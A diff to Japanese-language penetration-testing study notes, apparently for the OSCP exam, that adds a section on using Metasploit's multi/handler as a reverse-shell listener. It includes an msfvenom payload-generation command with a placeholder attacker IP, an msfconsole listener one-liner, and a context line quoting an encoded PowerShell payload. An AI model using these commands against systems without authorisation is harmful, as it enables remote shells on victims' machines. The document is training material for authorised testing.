@@ -458,6 +458,47 @@ powershell -enc '<Base64エンコードされたペイロード>'
 
 - [ ] todo:要まとめ
 
+Metasploitフレームワークの `exploit/multi/handler` モジュールは、socat や netcat と同様にリバースシェルを受信するためのリスナーとして使用される。
+
+- ✅ Windowsでも安定して動作する
+- ✅ ファイルのアップロード・ダウンロードなど多くの機能を内蔵している
+- ✅ **OSCP examで無制限に利用可能**
+- ❌ Meterpreterシェルは必ずMetasploit経由の通信が必要（通常のシェルペイロードはncでも受信可能）
+
+**Meterpreterシェルを使用したい場合は必須。** ステージドペイロードを使用する場合も、このハンドラを使用する（→ [☠️Msfvenom](#) 参照）。
+
+>[!Info]
+
+> 💡 
+
+### 手順
+
+**1. msfvenomでペイロードを生成**（→ [☠️Msfvenom](#) 参照）
+
+zsh
+
+```zsh
+sudo msfvenom -p <OS>/<arch>/<payload> -f <出力形式> -o <filename> LHOST=<attacker-IP> LPORT=<port>
+```
+
+> ⚠️ 1024番以下のポートを使用する場合は `sudo` が必要
+
+**2. multi/handlerを起動してリスナーを開始**
+
+zsh
+
+```zsh
+msfconsole -q -x "use exploit/multi/handler; set payload <生成したペイロード>; set LHOST <attacker_IP>; set LPORT <port>; run"
+```
+
+- `exploit -j` でバックグラウンド実行が可能
+- 複数のセッションがアクティブな場合：
+    - `sessions` → アクティブなセッション一覧を表示
+    - `sessions <ID>` → 対象セッションをフォアグラウンドに切り替え
+
+
+
+
 - ✅️Windowsにおいても安定している
 - Meterpreterシェルを使用したい場合は必須で、ステージドペイロードを使用する場合は、このツールを使用する（[[☠️Msfvenom]]）
 - Metasploitフレームワークの`exploit/multi/handler`モジュールはsocat や netcat のように、リバースシェルを受信するために使用されるリスナー（OSCP examで無制限に利用可能）
